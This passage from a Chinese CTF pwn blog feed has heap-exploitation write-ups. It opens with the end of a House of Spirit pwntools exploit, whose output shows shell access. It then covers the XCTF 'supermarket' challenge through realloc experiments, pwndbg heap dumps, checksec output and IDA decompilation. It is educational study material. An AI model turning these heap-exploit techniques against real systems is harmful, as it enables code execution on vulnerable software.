class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'how long?\n'</span><span class="token punctuation">,</span><span class="token string">'48'</span><span class="token punctuation">)</span>                                         <span class="token comment" spellcheck="true">#48对应我们释放的那个fake_chunk </span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'your choice : '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0xa</span> bytes<span class="token operator">:</span>    <span class="token string">'good bye~\n'</span>good bye<span class="token operator">~</span>$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><p><strong>HOS漏洞总结就是：目标数据处于两个可控数据段的中间，堆指针可被覆盖成任意地址</strong></p><h2 id="MASS"><a href="#MASS" class="headerlink" title="MASS"></a>MASS</h2><blockquote><p>size_t在C语言中就有了。<br>它是一种“整型”类型，里面保存的是一个整数，就像int、long那样。这种整数用来记录一个大小（size）。size_t的全称应该是size type，就是说“一种用来记录大小的数据类型”。<br>通常我们用sizeof(XXX)操作，这个操作所得到的结果就是size_t类型。<br>因为size_t类型的数据其实是保存了一个整数，所以它也可以做加减乘除，也可以转化为int并赋值给int类型的变量。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-supermarket</title>
      <link href="/2020/09/14/xctf-challenge-supermarket/"/>
      <url>/2020/09/14/xctf-challenge-supermarket/</url>
      
        <content type="html"><![CDATA[<h2 id="realloc函数"><a href="#realloc函数" class="headerlink" title="realloc函数"></a>realloc函数</h2><blockquote><p>void <em>realloc(void *ptr, size_t size)<br>语法<br>指针名=（数据类型</em>）realloc（要改变内存大小的指针名，新的大小）。<br>新的大小可大可小（如果新的大小大于原内存大小，则新分配部分不会被初始化；如果新的大小小于原内存大小，可能会导致数据丢失 ）<br>头文件<br>#include &lt;stdlib.h&gt; 有些编译器需要#include &lt;malloc.h&gt;，在TC2.0中可以使用alloc.h头文件<br>功能<br>先判断当前的指针是否有足够的连续空间，如果有，扩大mem_address指向的地址，并且将mem_address返回，如果空间不够，先按照newsize指定的大小分配空间，将原有数据从头到尾拷贝到新分配的内存区域，而后释放原来mem_address所指内存区域（注意：原来指针是自动释放，不需要使用free），同时返回新分配的内存区域的首地址。即重新分配存储器块的地址。<br>返回值<br>如果重新分配成功则返回指向被分配内存的指针，否则返回空指针NULL。<br>-—百度百科<br>感觉还是有点神乎其神，所以还是自己看看<br>环境：1604<br>测试代码：</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span><span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"chunk1_addr ===>%p\n"</span><span class="token punctuation">,</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>ptr<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> space<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>space<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> ptr1 <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span>space<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"chunk2_addr ====>%p\n"</span><span class="token punctuation">,</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token macro property">#gcc -g -no-pie realloc_0.c </span></code></pre><p>三个结果：</p><pre class=" language-java"><code class="language-java">──────────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>XCTF<span class="token operator">/</span>supermar<span class="token operator">/</span>realloc_0<span class="token punctuation">.</span>c    <span class="token number">8</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"chunk1_addr ===>%p\n"</span><span class="token punctuation">,</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">9</span>     <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>ptr<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">10</span>     <span class="token keyword">int</span> space<span class="token punctuation">;</span>   <span class="token number">11</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>space<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">12</span>     <span class="token keyword">void</span><span class="token operator">*</span> ptr1 <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span>space<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//space=0x80</span> ► <span class="token number">13</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"chunk2_addr ====>%p\n"</span><span class="token punctuation">,</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">14</span>        <span class="token number">15</span>    <span class="token number">16</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">17</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffde50</span> ◂— <span class="token number">0x8000400790</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffde58</span> —▸ <span class="token number">0x602010</span> ◂— <span class="token number">0xa414141414141</span> <span class="token comment" spellcheck="true">/* 'AAAAAA\n' */</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> ↓<span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffde68</span> ◂— <span class="token number">0x2b84373fbca89f00</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│ rbp  <span class="token number">0x7fffffffde70</span> —▸ <span class="token function">0x400790</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffde78</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffde80</span> ◂— <span class="token number">0x1</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffde88</span> —▸ <span class="token number">0x7fffffffdf58</span> —▸ <span class="token number">0x7fffffffe2c5</span> ◂— <span class="token string">'/home/matrix/XCTF/supermar/a.out'</span>────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           40075b main<span class="token operator">+</span><span class="token number">133</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> parseheap addr                prev                size                 status              fd                bk                <span class="token number">0x602000</span>            <span class="token number">0x0</span>                 <span class="token number">0x90</span>                 Used                None              None<span class="token number">0x602090</span>            <span class="token number">0x0</span>                 <span class="token number">0x410</span>                Used                None              None   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span>printf再调用时会使用堆空间，一用就是一大块<span class="token number">0x6024a0</span>            <span class="token number">0x0</span>                 <span class="token number">0x410</span>                Used                None              None   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span>可能还有scanf函数也是帮凶pwndbg<span class="token operator">></span> 这是space刚好等于原来申请chunk大小<span class="token number">0x80</span>，原chunk没有发生变化</code></pre><p>来看看要是space小于0x80会咋样</p><pre class=" language-java"><code class="language-java">──────────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>XCTF<span class="token operator">/</span>supermar<span class="token operator">/</span>realloc_0<span class="token punctuation">.</span>c    <span class="token number">8</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"chunk1_addr ===>%p\n"</span><span class="token punctuation">,</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">9</span>     <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>ptr<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">10</span>     <span class="token keyword">int</span> space<span class="token punctuation">;</span>   <span class="token number">11</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>space<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">12</span>     <span class="token keyword">void</span><span class="token operator">*</span> ptr1 <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span>space<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//space=0x20</span> ► <span class="token number">13</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"chunk2_addr ====>%p\n"</span><span class="token punctuation">,</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">14</span>        <span class="token number">15</span>    <span class="token number">16</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">17</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffde50</span> ◂— <span class="token number">0x2000400790</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffde58</span> —▸ <span class="token number">0x602010</span> ◂— <span class="token string">'AAAAAAAAA\n'</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> ↓<span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffde68</span> ◂— <span class="token number">0x79f17adda96ddb00</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│ rbp  <span class="token number">0x7fffffffde70</span> —▸ <span class="token function">0x400790</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffde78</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffde80</span> ◂— <span class="token number">0x1</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffde88</span> —▸ <span class="token number">0x7fffffffdf58</span> —▸ <span class="token number">0x7fffffffe2c5</span> ◂— <span class="token string">'/home/matrix/XCTF/supermar/a.out'</span>────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           40075b main<span class="token operator">+</span><span class="token number">133</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> parseheap addr                prev                size                 status              fd                bk                <span class="token number">0x602000</span>            <span class="token number">0x0</span>                 <span class="token number">0x30</span>                 Used                None              None<span class="token number">0x602030</span>            <span class="token number">0x0</span>                 <span class="token number">0x60</span>                 Freed                <span class="token number">0x0</span>              None<span class="token number">0x602090</span>            <span class="token number">0x0</span>                 <span class="token number">0x410</span>                Used                None              None<span class="token number">0x6024a0</span>            <span class="token number">0x0</span>                 <span class="token number">0x410</span>                Used                None              Nonepwndbg<span class="token operator">></span> 这时候会从原chunk中切下满足space的chunk，剩下的成为freed chunk（fastbin）</code></pre><p>当space大于0x80</p><pre class=" language-java"><code class="language-java">──────────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>XCTF<span class="token operator">/</span>supermar<span class="token operator">/</span>realloc_0<span class="token punctuation">.</span>c    <span class="token number">8</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"chunk1_addr ===>%p\n"</span><span class="token punctuation">,</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">9</span>     <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>ptr<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">10</span>     <span class="token keyword">int</span> space<span class="token punctuation">;</span>   <span class="token number">11</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>space<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">12</span>     <span class="token keyword">void</span><span class="token operator">*</span> ptr1 <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span>space<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//space=0x90</span> ► <span class="token number">13</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"chunk2_addr ====>%p\n"</span><span class="token punctuation">,</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">14</span>        <span class="token number">15</span>    <span class="token number">16</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">17</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffde50</span> ◂— <span class="token number">0x9000400790</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffde58</span> —▸ <span class="token number">0x602010</span> —▸ <span class="token function">0x7ffff7dd1b78</span> <span class="token punctuation">(</span>main_arena<span class="token operator">+</span><span class="token number">88</span><span class="token punctuation">)</span> —▸ <span class="token number">0x602950</span> ◂— <span class="token number">0x0</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│      <span class="token number">0x7fffffffde60</span> —▸ <span class="token number">0x6028c0</span> ◂— <span class="token number">0xa414141414141</span> <span class="token comment" spellcheck="true">/* 'AAAAAA\n' */</span><span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffde68</span> ◂— <span class="token number">0x4d304c42e609de00</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│ rbp  <span class="token number">0x7fffffffde70</span> —▸ <span class="token function">0x400790</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffde78</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffde80</span> ◂— <span class="token number">0x1</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffde88</span> —▸ <span class="token number">0x7fffffffdf58</span> —▸ <span class="token number">0x7fffffffe2c5</span> ◂— <span class="token string">'/home/matrix/XCTF/supermar/a.out'</span>────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           40075b main<span class="token operator">+</span><span class="token number">133</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> parseheap addr                prev                size                 status              fd                bk                <span class="token number">0x602000</span>            <span class="token number">0x0</span>                 <span class="token number">0x90</span>                 Freed     <span class="token number">0x7ffff7dd1b78</span>    <span class="token number">0x7ffff7dd1b78</span>   （在 unsorted bin中）<span class="token number">0x602090</span>            <span class="token number">0x90</span>                <span class="token number">0x410</span>                Used                None              None<span class="token number">0x6024a0</span>            <span class="token number">0x0</span>                 <span class="token number">0x410</span>                Used                None              None<span class="token number">0x6028b0</span>            <span class="token number">0x0</span>                 <span class="token number">0xa0</span>                 Used                None              Nonepwndbg<span class="token operator">></span> 可以看到：将原chunk free然后再通过堆管理器分配得到满足<span class="token number">0x90</span>的chunk，同时将原数据复制到新chunk中，这里没有直接让原chunk向后扩大data字段，是因为后面已经有两个used chunk 了</code></pre><p>现在测试代码为：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">void</span><span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>ptr<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> space<span class="token punctuation">;</span>    space <span class="token operator">=</span> <span class="token number">144</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> ptr1 <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span>space<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java">──────────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>XCTF<span class="token operator">/</span>supermar<span class="token operator">/</span>realloc_0<span class="token punctuation">.</span>c    <span class="token number">8</span>     <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>ptr<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">9</span>     <span class="token keyword">int</span> space<span class="token punctuation">;</span>   <span class="token number">10</span>     space <span class="token operator">=</span> <span class="token number">144</span><span class="token punctuation">;</span>   <span class="token number">11</span>     <span class="token keyword">void</span><span class="token operator">*</span> ptr1 <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span>space<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//space=0x90</span>   <span class="token number">12</span>      ► <span class="token number">13</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">14</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffde50</span> —▸ <span class="token function">0x400610</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffde58</span> ◂— <span class="token number">0x90004004c0</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│      <span class="token number">0x7fffffffde60</span> —▸ <span class="token number">0x602010</span> ◂— <span class="token number">0xa4141414141</span> <span class="token comment" spellcheck="true">/* 'AAAAA\n' */</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> ↓<span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│ rbp  <span class="token number">0x7fffffffde70</span> —▸ <span class="token function">0x400610</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffde78</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffde80</span> ◂— <span class="token number">0x1</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffde88</span> —▸ <span class="token number">0x7fffffffdf58</span> —▸ <span class="token number">0x7fffffffe2c5</span> ◂— <span class="token string">'/home/matrix/XCTF/supermar/a.out'</span>────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           <span class="token number">400607</span> main<span class="token operator">+</span><span class="token number">81</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> parseheap addr                prev                size                 status              fd                bk                <span class="token number">0x602000</span>            <span class="token number">0x0</span>                 <span class="token number">0xa0</span>                 Used                None              None  </code></pre><p>可以看到这里原chunk后面没有used chunk 就直接扩大了（折磨top chunk）</p><p>void *realloc(void *ptr, size_t size)所以有这几种基本情况：</p><ul><li>size = chunk_ptr-&gt;size,天下太平，啥事没有</li><li>size &lt; chunk_ptr-&gt;size,从原chunk中切下多余的空间（可能会造成数据丢失）多余的自成一家free chunk</li><li>size &gt; chunk_ptr-&gt;size<ul><li>当原chunk后面没有used chunk 直接扩大</li><li>当chunk后面有used chunk 从堆管理器申请合适的chunk，然后将原数据复制过去</li></ul></li></ul><p>别的不说，一波肉蛋冲击直接看题。</p><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>XCTF<span class="token operator">/</span>supermar$ checksec supermarket<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/XCTF/supermar/supermarket'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span> #  ____ _   _ ___  ____ ____ ___  ____ ____ ____ ____ #  <span class="token operator">|</span>     \_<span class="token operator">/</span>  <span class="token operator">|</span>__<span class="token punctuation">]</span> <span class="token operator">|</span>___ <span class="token operator">|</span>__<span class="token operator">/</span> <span class="token operator">|</span>__<span class="token punctuation">]</span> <span class="token operator">|</span>___ <span class="token operator">|</span>__<span class="token operator">|</span> <span class="token operator">|</span>    <span class="token operator">|</span>___ #  <span class="token operator">|</span>___   <span class="token operator">|</span>   <span class="token operator">|</span>__<span class="token punctuation">]</span> <span class="token operator">|</span>___ <span class="token operator">|</span>  \ <span class="token operator">|</span>    <span class="token operator">|</span>___ <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>___ <span class="token operator">|</span>___ #                                                     #  Welcome to CyberPeace supermarket<span class="token operator">!</span>#                                                     <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>menu<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">.</span> add a commodity<span class="token number">2</span><span class="token punctuation">.</span> del a commodity<span class="token number">3</span><span class="token punctuation">.</span> list commodities<span class="token number">4</span><span class="token punctuation">.</span> Change the price of a commodity<span class="token number">5</span><span class="token punctuation">.</span> Change the description of a commodity<span class="token number">6</span><span class="token punctuation">.</span> exityour choice<span class="token operator">>></span> 经典堆题</code></pre><p>开启NX，32位 岂不美哉~</p><h2 id="IDA–关键函数"><a href="#IDA–关键函数" class="headerlink" title="IDA–关键函数"></a>IDA–关键函数</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">char</span> src<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-24h]</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-10h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_goods<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//从这里可以看出bss_goods放的是商品指针，最多16个商品 是指针数组</span>    <span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">></span> <span class="token number">15</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"no more space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read_buf_n</span><span class="token punctuation">(</span><span class="token 